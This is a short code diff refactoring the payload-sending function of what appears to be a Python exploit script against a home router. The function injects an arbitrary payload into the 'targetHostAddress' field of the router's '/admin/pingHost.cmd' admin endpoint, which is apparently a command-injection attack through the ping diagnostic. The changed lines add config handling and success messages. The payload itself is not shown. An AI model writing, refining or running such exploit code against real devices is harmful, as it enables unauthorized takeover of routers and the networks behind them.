@@ -34,12 +34,16 @@ def get_session():
 
 
 def send_payload(payload):
-    print(payload)
-    url =3D router_host + "/admin/pingHost.cmd"
-    headers =3D {"Authorization": "Basic {}".format(authorization_header)}
-    params =3D {"action": "add", "targetHostAddress": payload, "sessionKey"=
-: get_session()}
-    requests.get(url, headers=3Dheaders, params=3Dparams).text
+    session_key = get_session()
+    url = f"{config['router_host']}/admin/pingHost.cmd"
+    headers = {"Authorization": config['authorization_header']}
+    params = {"action": "add", "targetHostAddress": payload, "sessionKey": session_key}
+    response = requests.get(url, headers=headers, params=params)
+    if response.status_code == 200:
+        print("Payload successfully sent.")
+    else:
+        print("Failed to send payload.")
+
 
 
 main()
